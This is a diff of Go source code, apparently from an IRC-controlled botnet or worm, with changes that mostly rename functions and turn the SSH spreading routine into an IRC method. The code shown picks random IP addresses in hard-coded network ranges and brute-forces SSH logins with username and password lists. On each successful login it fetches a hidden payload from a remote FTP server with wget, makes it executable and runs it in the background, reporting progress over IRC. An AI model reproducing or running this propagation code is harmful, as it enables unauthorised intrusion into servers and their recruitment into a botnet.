@@ -54,7 +54,7 @@ func genRange(max, min int) string {
 	return fmt.Sprint(rand.Intn(max+1-min) + min)
 }
 
-func manageIP_range(mainRange, setRange string) string {
+func manageRange(mainRange, setRange string) string {
 	var ipGen []string
 	ipGen = append(ipGen, mainRange)
 	ipGen = append(ipGen, setRange, ".")
@@ -72,21 +72,21 @@ func manageIP_range(mainRange, setRange string) string {
 func nextIP(ipRange string) string {
 	switch ipRange {
 	case chpn2:
-		return manageIP_range(ipRange, genRange(97, 96))
+		return manageRange(ipRange, genRange(97, 96))
 	case chpn6:
-		return manageIP_range(ipRange, genRange(235, 234))
+		return manageRange(ipRange, genRange(235, 234))
 	case cttc2:
-		return manageIP_range(ipRange, genRange(209, 208))
+		return manageRange(ipRange, genRange(209, 208))
 	case cttc3:
-		return manageIP_range(ipRange, genRange(219, 218))
+		return manageRange(ipRange, genRange(219, 218))
 	case cttc7:
-		return manageIP_range(ipRange, genRange(95, 94))
+		return manageRange(ipRange, genRange(95, 94))
 	case cspn1:
-		return manageIP_range(ipRange, genRange(250, 246))
+		return manageRange(ipRange, genRange(250, 246))
 	case cspn2:
-		return manageIP_range(ipRange, genRange(43, 42))
+		return manageRange(ipRange, genRange(43, 42))
 	default:
-		return manageIP_range(ipRange, "")
+		return manageRange(ipRange, "")
 	}
 }
 
@@ -119,7 +119,7 @@ func ssh_session(ssh_session *ssh.Client, command string) {
 	session.Close()
 }
 
-func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
+func (irc *IRC) SSH_Conn(set_FTP, set_payload string) {
 	netList := []string{
 		chpn1, chpn2, chpn3, chpn4, chpn5, chpn6,
 		cgpn1, cgpn2, cgpn3, cgpn4, cgpn5,
@@ -153,23 +153,23 @@ func SSH_Conn(reportIRC net.Conn, set_FTP, set_chan, set_payload string) {
 			if turnRange == "" {
 				checkPort(target)
 			} else {
-				IRC_Report(reportIRC, set_chan, "Try to login to "+turnRange)
+				irc.IRC_Report("Try to login to " + turnRange)
 				var logCheck bool
 
 				for user := range userList {
 					for pass := range passList {
 						_session, err := ssh.Dial("tcp", turnRange, ssh_config(userList[user], passList[pass]))
 						if err == nil {
-							IRC_Report(reportIRC, set_chan, "Login success at "+turnRange)
+							irc.IRC_Report("Login success at " + turnRange)
 							ssh_session(_session, "wget -O ."+set_payload+" "+set_FTP)
-							IRC_Report(reportIRC, set_chan, "WGET on "+turnRange)
+							irc.IRC_Report("WGET on " + turnRange)
 							ssh_session(_session, "chmod +x ."+set_payload)
 							go ssh_session(_session, "./."+set_payload+" &")
 							logCheck = true
 							break
 						} else {
-							IRC_Report(reportIRC, set_chan, "Failed to login to "+
-								turnRange+" > "+fmt.Sprintf("%v:%v", userList[user], passList[pass]))
+							irc.IRC_Report("Failed to login to " + turnRange + " > " +
+								fmt.Sprintf("%v:%v", userList[user], passList[pass]))
 						}
 					}
 					if logCheck || Scan_Switch {
